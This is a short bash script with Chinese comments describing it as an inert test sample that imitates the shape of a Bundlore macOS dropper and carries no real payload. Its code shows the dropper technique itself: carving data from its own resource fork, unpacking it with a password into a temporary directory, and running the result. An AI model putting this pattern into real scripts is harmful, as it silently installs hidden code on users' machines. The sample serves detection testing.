#!/bin/bash
# 惰性样本：只模仿 Bundlore 投放器的形状——从自己的资源派生按偏移截取数据、带密码解压到临时目录再执行。
# 仓库里的这份文件没有资源派生（git 不保存），测试运行时只写入假图标数据和一个压缩包文件头，没有真实载荷。
cd "$(dirname "$0")"
tail -c +9093 "Install.command/..namedfork/rsrc" | funzip -oZwb > "$TMPDIR/Installer_x"
chmod +x "$TMPDIR/Installer_x" && "$TMPDIR/Installer_x"
